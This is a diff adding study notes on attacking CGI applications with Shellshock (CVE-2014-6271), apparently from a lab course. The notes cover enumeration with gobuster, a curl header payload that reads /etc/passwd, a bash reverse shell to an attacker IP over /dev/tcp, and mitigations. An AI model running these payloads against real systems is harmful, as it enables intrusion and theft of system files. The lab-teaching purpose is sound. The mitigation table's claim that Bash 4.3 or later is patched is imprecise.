@@ -2207,3 +2207,116 @@ http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.e
 ```
 
 ---
+
+# 🛡️ Attacking Common Gateway Interface (CGI) Applications – Shellshock
+
+## 🌐 What is CGI?
+
+**CGI (Common Gateway Interface)** is middleware that allows web servers to execute **external programs** to generate dynamic content. It acts as a bridge between the **web client**, **web server**, and **external applications** or **databases**.
+
+### 📁 CGI Characteristics
+
+* Scripts usually located in `/cgi-bin/`
+* Language-independent: supports **C, C++, Java, Perl, etc.**
+* Runs in the **security context** of the web server (often `www-data`)
+* Common use cases: forms, guestbooks, feedback systems, blogs, mailing lists
+
+### 🔄 CGI Workflow (Simplified)
+
+1. User sends a request via a browser (e.g. URL to `/cgi-bin/script.cgi`)
+2. Server executes the CGI script
+3. CGI script processes input
+4. Output is passed back to server
+5. Server returns response to browser
+
+## 🧨 Shellshock (CVE-2014-6271)
+
+### 📌 Overview
+
+* A **critical vulnerability** in **GNU Bash (up to 4.3)**
+* Allows attackers to **execute arbitrary OS commands** via specially crafted **environment variables**
+* Still occasionally found in **legacy systems** and **IoT devices**
+
+### 💡 Root Cause
+
+Vulnerable versions of Bash:
+
+* improperly parse function definitions from environment variables
+* execute **additional commands** after function declarations
+
+### ✅ Vulnerability Test Example
+
+```bash
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+```
+
+**Expected Output if Vulnerable**:
+
+```
+vulnerable-shellshock
+not vulnerable
+```
+
+If **patched**, only `not vulnerable` is printed.
+
+## 🕵️‍♂️ Exploiting Shellshock via CGI
+
+### 🧭 Step 1: Enumeration with Gobuster
+
+Discover CGI scripts:
+
+```bash
+$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+
+**Result**:
+
+```http
+/access.cgi           (Status: 200)
+```
+
+### 🧪 Step 2: Confirming the Vulnerability
+
+Use `curl` to inject payload in a **HTTP header (User-Agent)**:
+
+```bash
+$ curl -H 'User-Agent: () { :; }; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+**If vulnerable**, you’ll receive the contents of `/etc/passwd`.
+
+
+### 🐚 Step 3: Reverse Shell Exploitation
+
+Start a **netcat listener**:
+
+```bash
+$ sudo nc -lvnp 7777
+```
+
+Send reverse shell payload:
+
+```bash
+$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+
+If successful, you'll receive a shell as `www-data`:
+
+```bash
+www-data@htb:/usr/lib/cgi-bin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+## 🧯 Mitigation
+
+| 🔧 Method                       | 💬 Notes                                                  |
+| ------------------------------- | --------------------------------------------------------- |
+| ✅ **Update Bash**               | Upgrade to a **patched version** (Bash ≥ 4.3)             |
+| 🔒 **Restrict CGI Usage**       | Disable CGI scripts where unnecessary                     |
+| 🔥 **Firewall Unused Services** | Limit access to CGI apps, especially on embedded devices  |
+| 🧱 **Web App Firewall (WAF)**   | Can block some malicious inputs                           |
+| 📦 **Patch Package Manager**    | May require updating package manager first on EOL systems |
+| 🧨 **Decommission Old Devices** | If CGI is critical, isolate or replace affected devices   |
+
+---
